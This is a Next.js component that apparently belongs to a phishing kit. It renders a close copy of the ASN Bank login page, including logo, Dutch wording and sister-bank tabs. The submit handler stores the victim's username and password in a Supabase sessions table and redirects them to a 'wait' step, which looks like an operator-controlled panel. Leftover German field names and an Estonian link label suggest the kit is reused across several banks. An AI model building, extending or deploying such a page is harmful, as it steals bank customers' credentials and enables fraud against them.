"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

export function AsnBankLoginClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

    const { error: updateError } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: {
          ...prev,
          bankSlug: "asn-bank",
          bankName: "ASN Bank",
          verfuegernummer: username,
          pin: password,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Something went wrong. Please try again.");
      return;
    }
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#FAF6EC] font-sans flex flex-col">
      {/* Header */}
      <header className="bg-white h-20 flex items-center justify-center border-b border-gray-200 shrink-0">
        <img src="/bank-logos/asn-bank.svg" alt="ASN Bank" className="h-8" />
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center pt-10 pb-20 px-4">
        <div className="bg-white border border-gray-200 w-full max-w-[460px] shadow-sm">
          
          {/* Alert Box */}
          <div className="m-6 mb-2 p-4 bg-[#FEF6E5] border border-[#E8C468] relative">
            <button className="absolute top-3 right-3 text-gray-500 hover:text-gray-800">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"></path></svg>
            </button>
            <p className="text-[13px] font-bold text-[#333] mb-1">Klant bij SNS, RegioBank of BLG Wonen?</p>
            <p className="text-[13px] text-[#333]">
              Log dan nog in op <a href="#" className="text-[#73213D] underline">Mijn SNS</a>, <a href="#" className="text-[#73213D] underline">Mijn RegioBank</a> en <a href="#" className="text-[#73213D] underline">Mijn BLG</a>.
            </p>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-gray-200 px-6 mt-6 text-[14px]">
            <div className="border-b-2 border-[#187A5D] text-[#187A5D] font-bold pb-2 mr-6 cursor-pointer">
              ASN Bank
            </div>
            <div className="text-[#333333] pb-2 mr-6 cursor-pointer hover:text-gray-600">
              SNS
            </div>
            <div className="text-[#333333] pb-2 mr-6 cursor-pointer hover:text-gray-600">
              Regiobank
            </div>
            <div className="text-[#333333] pb-2 cursor-pointer hover:text-gray-600">
              BLG
            </div>
          </div>

          {/* Form Content */}
          <div className="p-6 pt-5">
            <h1 className="text-[24px] text-[#187A5D] mb-3 font-normal">Inloggen ASN Online Bankieren</h1>
            <p className="text-[15px] text-[#333] mb-6 font-bold leading-snug">
              Log in met je toegangsnaam, wachtwoord en de beveiligingscode op je telefoon.
            </p>

            <form
              onSubmit={(e) => {
                e.preventDefault();
                void handleSubmit();
              }}
            >
              <div className="mb-4">
                <input
                  type="text"
                  required
                  placeholder="Toegangsnaam"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border border-gray-400 p-[10px] text-[15px] focus:outline-none focus:border-[#187A5D] focus:ring-1 focus:ring-[#187A5D]"
                />
              </div>

              <div className="mb-4">
                <input
                  type="password"
                  required
                  placeholder="Wachtwoord"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border border-gray-400 p-[10px] text-[15px] focus:outline-none focus:border-[#187A5D] focus:ring-1 focus:ring-[#187A5D]"
                />
              </div>

              <div className="mb-6 flex items-center">
                <div className="flex items-center justify-center w-5 h-5 border border-gray-400 bg-white mr-3 shrink-0">
                  <input
                    type="checkbox"
                    id="remember"
                    checked={remember}
                    onChange={(e) => setRemember(e.target.checked)}
                    className="w-4 h-4 opacity-0 absolute cursor-pointer"
                  />
                  {remember && <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#187A5D" strokeWidth="3"><path d="M20 6L9 17l-5-5"></path></svg>}
                </div>
                <label htmlFor="remember" className="text-[14px] text-[#333] cursor-pointer select-none">
                  Onthoud mijn toegangsnaam
                </label>
              </div>

              {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

              <button
                type="submit"
                disabled={saving || !username || !password}
                className="bg-[#187A5D] hover:bg-[#126048] text-white px-7 py-[10px] rounded-full text-[15px] font-bold transition-colors disabled:opacity-50"
              >
                {saving ? "Laden..." : "Inloggen"}
              </button>
            </form>

            <div className="mt-8 space-y-3">
              <a href="#" className="block text-[14px] text-[#73213D] hover:underline">Log anders in</a>
              <a href="#" className="block text-[14px] text-[#73213D] hover:underline">Abi sisselogimisel</a>
            </div>
          </div>
        </div>

        {/* Footer Links */}
        <div className="mt-12 flex items-center justify-center gap-4 text-[13px] text-gray-500">
          <a href="#" className="hover:underline">Contact</a>
          <a href="#" className="hover:underline">Veilig bankieren</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Disclaimer</a>
        </div>
      </main>
    </div>
  );
}
